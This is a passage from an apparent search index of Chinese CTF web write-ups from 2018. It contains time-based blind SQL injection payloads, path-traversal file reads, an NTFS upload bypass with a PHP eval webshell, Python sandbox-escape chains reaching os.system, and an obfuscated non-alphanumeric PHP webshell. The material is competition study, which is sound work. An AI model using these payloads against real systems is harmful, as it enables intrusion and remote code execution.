{0},1)='{1}',sleep (10),1)='%\"\npayload_6 = \"a%' &amp;&amp; if((selEct substr(column_name,{0},1) from information_schema.columns where table_schema='ddctf'&amp;&amp;table_name='ctf_key4' limit {1},1)='{2}',sleep (10),1)='%\"\n# \u83b7\u53d6\u5230\u5217\u540d ctf_key4:secvalue; message: id,title,author,time,status\npayload_5 = \"a%' &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit {0},1)='{1}',sleep (10),1)='%\"\npayload_6 = \"a%' &amp;&amp; if((selEct substr(secvalue,{0},1) from ctf_key4 limit {1},1)='{2}',sleep (10),1)='%\"\n# \u83b7\u53d6\u5230flag DDCTF{MSBMCTFMXOCBYFYI}\n</code></pre>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#web01","title":"WEB01 \u4e13\u5c5e\u94fe\u63a5","text":"","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-1_1","title":"step 1:","text":"<p>\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0c\u9898\u76ee\u53ea\u8ddf\u94fe\u63a5IP\u6709\u5173\uff0c\u6240\u4ee5\u4e3b\u8981\u6709 <pre><code>http://116.85.48.102:5050/welcom/uuid #\u4e3b\u9875 \u6ce8\u610f\u5230\u4e0a\u9762\u6709email:3814166715717836733@didichuxing.com\nhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # \u7ed9\u4e86\u63d0\u793a\uff0c\u53ea\u80fd\u4e0b\u8f7d.class,.ks,.ico,.xml\u6587\u4ef6\nhttp://116.85.48.102:5050/news/topFiveNews # \u6ca1\u7528\nhttp://116.85.48.102:5050//flag/testflag/yourflag #\u8bbf\u95ee\u62a5\u9519\uff0c\u4f46\u662f\u66b4\u9732\u4e86\u63a7\u5236\u5668\u8def\u5f84com.didichuxing.ctf.controller.user.FlagController.java\n</code></pre></p>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-2_1","title":"step 2:","text":"<p>\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u731c\u8def\u5f84\u4e86\uff0c\u5728github\u4e0a\u627e\u4e86\u4e2aspringmvc+mybatis\u7684\u9879\u76ee,\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u4e0b\u51e0\u4e2a\u6587\u4ef6</p> <ul> <li>../../WEB-INF/web.xml # \u5f97\u5230WEB-INF/applicationContext.xml\uff0ccom.didichuxing.ctf.listener.InitListener</li> <li>../../WEB-INF/applicationContext.xml # \u5f97\u5230classpath:mybatis/config.xml</li> <li>../../WEB-INF/classes/mybatis/config.xml # \u5f97\u5230mapper/FlagMapper.xml</li> <li>../../WEB-INF/classes/mapper/FlagMapper.xml # sql\u8bed\u53e5</li> <li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li> <li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li> <li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li> <li>../../WEB-INF/classes/sdl.ks # \u5bc6\u94a5\u6587\u4ef6</li> <li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li> <li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li> </ul>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-3_1","title":"step 3:","text":"<p>\u628a\u4e0a\u8ff0\u7684class\u6587\u4ef6\u5728\u7ebf\u53cd\u7f16\u8bd1\u5230java\uff0c\u9605\u8bfb\u540e\u53d1\u73b0flagController.java</p> <p><pre><code>@RequestMapping(value={\"/getflag/{email:[0-9a-zA-Z']+}\"}, method={org.springframework.web.bind.annotation.RequestMethod.POST})\n  public String getFlag(@PathVariable(\"email\") String email, ModelMap model)\n  {\n    Flag flag = flagService.getFlagByEmail(email);\n\n\n    return \"Encrypted flag : \" + flag.getFlag();\n  }\n</code></pre> \u4ee5\u7528\u6237\u7684\u90ae\u7bb1\u6765\u83b7\u53d6\u52a0\u5bc6\u7684flag\uff0c\u90ae\u7bb1\u5c31\u662f\u9996\u9875\u4e0a\u7684\u90ae\u7bb1\uff0c\u7136\u540e\u901a\u8fc7listener.java\u5f97\u5230\u5177\u4f53\u7684\u52a0\u5bc6\u8fc7\u7a0b</p> <p><pre><code>        String flag = \"DDCTF{\" + Math.abs(sr.nextLong()) + \"}\";\n        String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\");\n\n        byte[] data = cipher.doFinal(flag.getBytes());\n        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n\n        Flag flago = new Flag();\n        flago.setId(Integer.valueOf(id));\n        flago.setFlag(byte2hex(data));\n        flago.setEmail(byte2hex(e));\n        flago.setOriginFlag(flag);\n        flago.setUuid(uuid);\n        flago.setOriginEmail(email);\n</code></pre> \u53ef\u4ee5\u770b\u5230Email\u88ab\u8f6c\u5316\u4e3a16\u8fdb\u5236\u7684\u5f62\u5f0f\uff0c\u6240\u4ee5\u9700\u8981\u5148\u5bf9\u90ae\u7bb1\u505a\u5904\u7406\uff0c\u7b80\u5355\u7f16\u5199\u4ee3\u7801\uff08\u540e\u9762\u653e\u4e0a\u6765\uff09\uff0c\u5f97\u52308EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27\uff0c\u4ee5<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>\u8bf7\u6c42\u540e\u5f97\u5230\u52a0\u5bc6\u7684flag\u3002</p>","tags":["ctf"]},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-4_1","title":"step 4:","text":"<p>\u63a5\u4e0b\u6765\u5c31\u662f\u5199\u4ee3\u7801\u89e3\u5bc6flag\u4e86\uff0c\u56e0\u4e3a\u5bc6\u94a5\u6587\u4ef6\u5728\u624b\uff0c\u53ea\u9700\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u53c2\u8003https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u7528\u4e86\u79c1\u94a5\u52a0\u5bc6\u516c\u94a5\u89e3\u5bc6\u3002 \u89e3\u5bc6\u540e\u5f97\u5230flag</p>","tags":["ctf"]},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/","title":"upload","text":"","tags":["ctf"]},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_1","title":"\u8003\u70b9","text":"<p>windows\u5e73\u53f0\u7684\u4e00\u4e9b\u7279\u6027 - windows\u5e73\u53f0\u7279\u6027 windows\u4e0b\u641c\u7d22\u6587\u4ef6\u7528\u5230\u7684\u662fFindFirstFile\uff0c\u8be5\u51fd\u6570\u6267\u884c\u65f6\uff0c\u4f1a\u5c06<code>\"&lt;\" =&gt; \"*\"</code>\u3001<code>\"&gt;\" =&gt; \"?\"</code>\u3001<code>\" =&gt; .</code>\uff0c\u6240\u4ee5\u5728\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u7279\u6027\u3002e.g.         <code>?filename=a&gt;  =&gt;  a?</code> \u5339\u914d\u5355\u4e2a\u5b57\u7b26         <code>?filename=a&lt;  =&gt;  a*</code> \u5339\u914d\u591a\u4e2a\u5b57\u7b26         <code>?filename=a\"  =&gt;  a.</code></p> <ul> <li>NTFS ADS\u7279\u6027</li> </ul> \u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7cfb\u7edf\u7ed3\u679c test.php:a.jpg \u751f\u6210test.php\uff0c\u4f46\u662f\u65e0\u5185\u5bb9 test.php::$DATA \u751f\u6210test.php\uff0c\u6709\u5185\u5bb9 test.php::$INDEX_ALLOCATION \u751f\u6210test.php\u6587\u4ef6\u5939 test.php::$DATA.jpg \u751f\u62100.jpg\uff0c\u6709\u5185\u5bb9 test.php::$DATA\\test.jpg \u751f\u6210aaa.jpg\uff0c\u6709\u5185\u5bb9","tags":["ctf"]},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_2","title":"\u8fc7\u7a0b","text":"<ul> <li> <p>step 1: \u529f\u80fd\u70b9#\u6587\u4ef6\u4e0a\u4f20 #\u4e0a\u4f20\u6587\u4ef6\u5bbd\u9ad8 =&gt; getshell \u73af\u5883\uff1aIIS7.0 Windows Server 2008 Standard Edition Service Pack 2</p> </li> <li> <p>step 2: \u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9ed1\u540d\u5355php\uff0c\u6587\u4ef6\u540d\u524d\u7f00\u65f6\u95f4\u6233\u91cd\u5199\uff0c\u4f46\u622a\u53d6\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u6700\u540e\u4e00\u4e2a\u540e\u7f00\u4e0d\u53d8\u3002\u7b80\u5355\u5229\u7528ADS\u7279\u6027\uff0c\u4e0a\u4f20test.php::$DATA</p> </li> <li> <p>step 3: \u4e0a\u4f20\u4e86\u6587\u4ef6\u540e\uff0c\u9700\u8981\u627e\u5230\u6587\u4ef6\u76ee\u5f55\u3002pic.php\u8fd4\u56de\u4e86\u4e0a\u4f20\u6587\u4ef6\u5bbd\u548c\u9ad8\uff0c\u731c\u6d4b\u5176\u4f7f\u7528\u4e86getimagesize\uff0c\u60f3\u5230\u524d\u6bb5\u65f6\u95f4\u7684\u4e00\u7bc7\u5e16\u5b50\uff0c\u5199\u4e2a\u811a\u672c\u8dd1\u8be5\u590d\u6742\u76ee\u5f55</p> </li> </ul> <pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Created by wh1t3P1g at 2018/4/11\n\nimport requests\n\nstr=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nret=\"\"\nfor i in range(32):\n    for c in str:\n        t=ret+c\n        url=\"http://47.90.97.18:9999/pic.php?filename=../\"+t+\"%3C/1523456340.jpg\"\n        r=requests.get(url)\n        if \"width\" in r.content:\n            ret+=c\n            print ret\n            break\n</code></pre> <p>\u5f97\u5230\u76ee\u5f5587194f13726af7cee27ba2cfe97b60df</p> <ul> <li>step 4: \u6709\u4e86\u76ee\u5f55\u5c31\u80fd\u8bbf\u95ee\u4e0a\u4f20\u7684\u4e00\u53e5\u8bdd<code>&lt;?php eval($_POST[cmd]);?&gt;</code>\uff0c\u7cfb\u7edf\u7981\u7528\u4e86\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u9700\u8981\u6267\u884c\u547d\u4ee4\u3002 \u8fd9\u91cc\u4e0d\u622a\u56fe\u4e86 <code>cmd=var_dump(glob(\"../*\"));</code>\u5f97\u5230flag.php\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u9700\u8981\u8bfb\u53d6flag.php\u7684\u5185\u5bb9 <code>cmd=echo readfile(\"../flag.php\");</code>\u5f97\u5230flag</li> </ul>","tags":["ctf"]},{"location":"writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/#_3","title":"\u603b\u7ed3","text":"<p>\u8fd9\u6b21\u5c31\u505a\u4e86\u4e00\u9053web\uff0c\u8fd8\u6709\u5f85\u63d0\u9ad8\u548c\u79ef\u7d2f:)</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/","title":"\u6982\u8ff0","text":"<p>\u524d\u51e0\u5929\u7684\u534e\u5c71\u676f\u51fa\u4e86\u4e00\u9053python\u7684\u6c99\u76d2\u9003\u9038\uff0c\u611f\u89c9\u633a\u6709\u610f\u601d\u7684\u3002\u5728\u7f51\u4e0a\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u5f88\u65e9\u5c31\u51fa\u8fc7\u8fd9\u79cd\u7c7b\u578b\u7684\u9898\uff0c\u6e90\u7801\u90fd\u5dee\u4e0d\u591a\u3002\u5b66\u4e60\u4e86\u4e00\u4e0b\u601d\u8def\uff0c\u8fd9\u91cc\u603b\u7ed3\u4e00\u4e0b\uff1a\uff09</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_2","title":"\u4ecb\u7ecd","text":"<p>\u6c99\u76d2\u6e90\u7801\u5982\u4e0b\uff1a <pre><code>#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nprint(\"Welcome to my Python sandbox! Enter commands below!\")\n\nbanned = [  \n    \"import\",\n    \"exec\",\n    \"eval\",\n    \"pickle\",\n    \"os\",\n    \"subprocess\",\n    \"kevin sucks\",\n    \"input\",\n    \"banned\",\n    \"cry sum more\",\n    \"sys\"\n]\n\ntargets = __builtins__.__dict__.keys()  \ntargets.remove('raw_input')  \ntargets.remove('print')  \nfor x in targets:# \u53bb\u9664\u6240\u6709\u5185\u7f6e\u51fd\u6570\u9664print raw_input\n    del __builtins__.__dict__[x]\n\nwhile 1:  \n    print(\"&gt;&gt;&gt;\", end=' ')\n    data = raw_input()\n\n    for no in banned:\n        if no.lower() in data.lower():\n            print(\"No bueno\")\n            break\n    else: # this means nobreak\n        exec data\n</code></pre> \u4e0d\u80fd\u51fa\u73b0banned\u5217\u8868\u4e2d\u7684\u5b57\u7b26\uff0c\u4f46\u662f\u9700\u8981\u8bfb\u53d6flag\u6587\u4ef6\u5185\u5bb9\u3002</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_3","title":"\u539f\u7406","text":"<p>\u7ed5\u8fc7\u524d\u9762\u7684\u9650\u5236\uff0c\u6211\u4eec\u6765\u4e00\u6b65\u4e00\u6b65\u770bpayload</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_4","title":"\u65b9\u6cd5\u4e00","text":"<p><pre><code>&gt;&gt;&gt; [].__class__\n&lt;type 'list'&gt;\n&gt;&gt;&gt; {}.__class__\n&lt;type 'dict'&gt;\n&gt;&gt;&gt; ().__class__\n&lt;type 'tuple'&gt;\n</code></pre> \u9996\u5148python\u7684\u5185\u7f6e\u5bf9\u8c61\u6709\u4e00\u4e2a__class__\u5c5e\u6027\u6765\u5b58\u50a8\u7c7b\u578b\uff0c\u6211\u4eec\u5f80\u4e0a\u627e\u4ed6\u7684\u7236\u7c7b\u4f7f\u7528__base__\u5c5e\u6027 <pre><code>&gt;&gt;&gt; {}.__class__.__base__\n&lt;type 'object'&gt;\n&gt;&gt;&gt; ().__class__.__base__\n&lt;type 'object'&gt;\n&gt;&gt;&gt; [].__class__.__base__\n&lt;type 'object'&gt;\n</code></pre> \u53ef\u4ee5\u770b\u5230\u8fd4\u56deobject\u5bf9\u8c61\uff0c\u56e0\u4e3apython\u4e2d\u4e00\u5207\u5747\u4e3a\u5bf9\u8c61\uff0c\u5747\u7ee7\u627fobject\u5bf9\u8c61\uff0c\u5f97\u5230object\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u5728\u901a\u8fc7\u5c5e\u6027__subclasses__\u6765\u67e5\u770bobject\u7684\u5b50\u7c7b\uff08\u5305\u62ec\u6240\u6709\u7684\u5185\u7f6e\u7c7b\uff09 <pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()\n[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;]\n</code></pre> \u56de\u5230\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u4e0a\uff0c\u6211\u4eec\u9700\u8981\u8bfb\u53d6flag\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u5728\u8fd9\u4e9b\u5b50\u7c7b\u4e2d\u6709\u54ea\u4e9b\u662f\u53ef\u4ee5\u7528\u6765\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u5462\uff1f\u7b54\u6848\u662ffile\u5b50\u7c7b\uff0c\u9996\u5148\u67e5\u627e\u4e00\u4e0bfile\u5b50\u7c7b\u7684\u4f4d\u7f6e\u3002 <pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)\n40\n</code></pre> \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6765\u5efa\u7acb\u4e00\u4e2afile\u7c7b\u7684\u522b\u540d\u8bfb\u6587\u4ef6\u5566\uff1a\uff09 <pre><code>&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]\n&gt;&gt;&gt; f('./flag.txt').read()\n</code></pre> \uff1f\uff1f\uff1f\u6ca1\u6709\u4efb\u4f55\u5185\u5bb9\u6253\u5370\u51fa\u6765\uff0c\u4f46\u662f\u4ed6\u6ca1\u6709\u62a5\u9519\u8bf4\u660e\u5b58\u5728flag.txt\u6587\u4ef6\uff0c\u6211\u4eec\u5c1d\u8bd5\u7528\u4ed6\u7ed9\u7684print\u51fd\u6570\u6765\u6253\u5370 <pre><code>&gt;&gt;&gt; print(f('./flag.txt').read())\nThis is a Flag{enjoy_yourself_ctfer}\n</code></pre> \u5f97\u5230flag</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_5","title":"\u65b9\u6cd5\u4e8c","text":"<p>\u540c\u6837\u7684\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528os\u6a21\u5757\u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4system\uff0c\u4f46\u662fos\u88ab\u5c4f\u853d <pre><code>&gt;&gt;&gt; import os\nNo bueno\n</code></pre> \u6211\u4eec\u5f97\u60f3\u5176\u4ed6\u529e\u6cd5\u6765\u83b7\u53d6shell\u3002\u901a\u8fc7\u4e0a\u9762\u7684\u601d\u8def\uff0c\u6211\u4eec\u9700\u8981\u627e\u4e00\u4e2a\u5b50\u7c7b\u4ed6\u80fd\u8c03\u7528os\u6a21\u5757\uff0c\u8fd9\u91cc\u7528\u5230\u4e86<code>warnings.catch_warnings</code>\u7c7b <pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)\n59\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]\n&lt;class 'warnings.catch_warnings'&gt;\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()\n['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']\n</code></pre> \u63a5\u4e0b\u6765\u518d\u627e<code>linecache</code> <pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index('linecache')\n25\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()\n['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']\n</code></pre> \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53ef\u4ee5\u8c03\u7528os\u6a21\u5757\uff0c\u63a5\u4e0b\u6765\u5c31\u8c03\u7528system\u51fd\u6570\u4e86 <pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12]\n&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;\n&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')\n144\n</code></pre> \u6574\u7406\u4e00\u4e0b <pre><code>&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12]\n&gt;&gt;&gt; a\n&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;\n&gt;&gt;&gt; s=a.__dict__.keys().index('system')\n&gt;&gt;&gt; s\n144\n&gt;&gt;&gt; s=a.__dict__.keys()[144]\n&gt;&gt;&gt; s\n'system'\n&gt;&gt;&gt; s=a.__dict__.values()[144]\n&gt;&gt;&gt; s('pwd')\n/home/xxxx/Desktop/code/python-code/test\n</code></pre> \u597d\u4e86\u73b0\u5728\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u4e86\uff0ccat\u4e00\u4e0bflag <pre><code>&gt;&gt;&gt; s('cat flag.txt')\nThis is a Flag{enjoy_yourself_ctfer}\n</code></pre></p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_6","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684python\u6c99\u76d2\u9003\u9038\uff0c\u53d1\u73b0\u8bfbpython\u5b98\u7f51\u624b\u518c\u8fd8\u662f\u5f88\u6709\u5fc5\u8981\u7684\uff0c\u627e\u4e2a\u65f6\u95f4\u4e00\u70b9\u4e00\u70b9\u770b\uff1a\uff09\u5171\u52c9</p>","tags":["ctf"]},{"location":"writeups/2018/old-python-sandbox-escape/#_7","title":"\u53c2\u8003","text":"<p>https://hexplo.it/escaping-the-csawctf-python-sandbox/</p>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/","title":"SUCTF","text":"<p>\u62bd\u4e86\u70b9\u65f6\u95f4\u505a\u4e862\u9053SUCTF\u7684web\u9898\uff0c\u8bb0\u5f55\u4e00\u4e0bwriteup\u3002</p>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#anonymous","title":"Anonymous","text":"","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_1","title":"\u8003\u70b9","text":"<p>php\u7684\u52a8\u6001\u51fd\u6570\u6267\u884c\uff0c\u4ee5\u53cacreate_function\u6240\u8fd4\u56de\u7684\u533f\u540d\u51fd\u6570</p>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#wp","title":"wp","text":"<p>\u8bbf\u95ee\u9898\u76ee\uff0c\u76f4\u63a5\u7ed9\u4e86\u6e90\u7801 <pre><code>$MY = create_function(\"\",\"some code\"); // \u6267\u884c\u4e86cat\u547d\u4ee4\uff0c\u8bfb\u53d6flag\u5185\u5bb9\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(\"function 'SUCTF_'.$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\n</code></pre> \u601d\u8def\u6bd4\u8f83\u660e\u786e\uff0c\u5c31\u662f\u60f3\u529e\u6cd5\u6267\u884ccreate_function\u6240\u4ea7\u751f\u7684\u533f\u540d\u51fd\u6570\u3002 \u800c\u5176\u4e2dSUCTF_32\uff0c\u8fd9\u4e2a\u51fd\u6570\u660e\u786e\u662f\u6ca1\u529e\u6cd5\u7206\u7834\u51fa\u6765\u7684\u3002\u90a3\u4e48\u5c31\u53ea\u80fd\u5728 <code>$MY</code> \u4e0a\u4e0b\u529f\u592b\u3002 \u6253\u5370\u4e00\u4e0b<code>$MY</code>\u7684\u503c\uff0c\u53d1\u73b0create_function\u8fd4\u56de\u4e86<code>\\0lambda_{number}</code>,\u90a3\u4e48\u5c31\u5f88\u660e\u786e\u4e86\uff0c\u53ea\u8981\u66b4\u529b\u4e00\u4e0b\u8fd9\u4e2anumber\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6267\u884c\u8be5\u51fd\u6570\uff0c\u8fd9\u91cc\u6211\u66b4\u529b\u4e86\u5927\u69821000\u591a\u5c31\u67092\u6761\u6267\u884c\u4e86</p>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#getshell","title":"Getshell","text":"","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_2","title":"\u8003\u70b9","text":"<p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</p>","tags":["ctf"]},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#wp_1","title":"wp","text":"<ol> <li>\u9996\u5148\u786e\u5b9a\u53ef\u7528\u5b57\u7b26\uff0c\u4f7f\u7528bp\u5c06\u6240\u6709\u53ef\u89c1\u5b57\u7b26\u66b4\u529b\u4e00\u904d\u540e\u53d1\u73b0\u53ef\u6253\u5370\u5b57\u7b26\u4e3a<code>$ () [] _ ~ . ; =</code>\uff0c\u4ee5\u53ca\u5176\u4ed6\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\u3002</li> <li>\u6839\u636ep\u725b\u7684\u535a\u5ba2\uff0c\u53d1\u73b0\u53d6\u53cd\u4e2d\u6587\u53ef\u4ee5\u8d77\u5230\u4f5c\u7528\uff0c\u6d4b\u8bd5<code>~({\u4e2d\u6587})</code>\u53d1\u73b0\u53ef\u6839\u636e\u4e2d\u6587\u7684utf-8\u7f16\u7801\u7684\u4e2d\u95f42\u4e2ahex\u7801\u8fdb\u884c\u5bf9\u5b57\u6bcd\u7684\u904d\u5386 http://www.herongyang.com/gb2312_gb/pinyin_32.html</li> <li>\u51d1\u51fa\u5b57\u7b26<code>assert</code>\uff0c<code>_GET</code>\uff0c\u5e76\u52a8\u6001\u6267\u884c\u3002 \u4e3a\u4e86\u51d1\u51fa\u4e0a\u9762\u7684\u5b57\u7b26\uff0c\u6211\u91c7\u7528\u9010\u4e2a\u53cd\u53d6\u53cd<code>bin2hex(~('a'))</code>\u83b7\u5f97\u4e2d\u6587utf-8\u7f16\u7801\u7684\u4e2d\u95f42\u4e2a\uff0c\u641c\u8868\u5373\u53ef\u627e\u5230\u5bf9\u5e94\u7684\u4e2d\u6587\uff0c\u5199\u4e00\u4e0b\u6211\u7684getshell\u4ee3\u7801 <pre><code>&lt;?php\n$_=~(\u778e);\n$__.=$_[[]==[]];\n$_=~(\u631f);\n$__.=$_[[]==[]];\n$_=~(\u631f);\n$__.=$_[[]==[]];\n$_=~(\u9699);\n$__.=$_[[]==[]];\n$_=~(\u5378);\n$__.=$_[[]==[]];\n$_=~(\u52cb);\n$__.=$_[[]==[]];\n\n$_=~(\u6821);\n$___.=$_[[]==[]];\n$_=~(\u4e0b);\n$___.=$_[[]==[]];\n$_=~(\u7ea4);\n$___.=$_[[]==[]];\n$_=~(\u5acc);\n$___.=$_[[]==[]];\n$___=$$___;\n$__($___[_]);\n</code></pre></li> <li>\u4e0a\u4f20\u4e86shell\u4e4b\u540e\u5c31\u6bd4\u8f83\u5bb9\u6613\u4e86\uff0c\u7ffb\u76ee\u5f55\u5373\u53ef <pre><code>system('ls /')\nsystem('cat /Th1s_14_f14g')\n</code></pre></li> 